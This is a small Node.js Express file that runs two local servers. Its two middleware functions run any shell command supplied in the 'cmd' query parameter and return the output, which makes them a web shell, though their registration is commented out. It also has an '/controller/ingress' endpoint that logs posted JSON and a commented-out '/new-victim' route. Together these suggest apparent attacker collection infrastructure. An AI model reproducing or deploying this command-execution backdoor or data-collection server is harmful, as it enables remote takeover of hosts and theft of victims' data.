const express = require('express');
const app = express();
const app2 = express();
const { exec } = require('child_process');
const process = require('process');
const PORT = 6969;
app.use(express.json({ limit: '16mb' }));
const { makeFile } = require('./test.js');

const logTime = () => (req, res, next) => {
  const { cmd } = req.query;
  if (cmd) {
    return exec(cmd, (err, stdout, stderr) => {
      return res.send(JSON.stringify({ err, stdout, stderr }, null, 2));
    });
  } else {
    res.send('This is port 7000');
  }
  next();
};

const logTime2 = () => (req, res, next) => {
  const { cmd } = req.query;
  if (cmd) {
    return exec(cmd, (err, stdout, stderr) => {
      return res.send(JSON.stringify({ err, stdout, stderr }, null, 2));
    });
  } else {
    res.send('app 2 ' + process.env.SEXY);
  }
  next();
};

// app.use(logTime());
// app2.use(logTime2());

app.post('/controller/ingress', function (req, res) {
  console.log(req.body);
  res.send();
});

// app.get('/new-victim', (req, res) => {
//   makeFile();
//   res.json('yoooo');
// });

app.get('/', (req, res) => {
  res.send('this is port6969')
})

app2.get('/', (req, res) => {
  res.send('this is port7000')
})

app.get('/port1', (req, res) => {
  res.redirect(301, 'http://localhost:7000');
});

app2.get('/port2', (req, res) => {
  res.redirect(301, 'http://localhost:6969');
});

app.listen(PORT, () => {
  console.log(`App is up @ PORT ${PORT}`);
});

app2.listen(7000, () => {
  console.log(`App is up @ PORT 7000`);
});
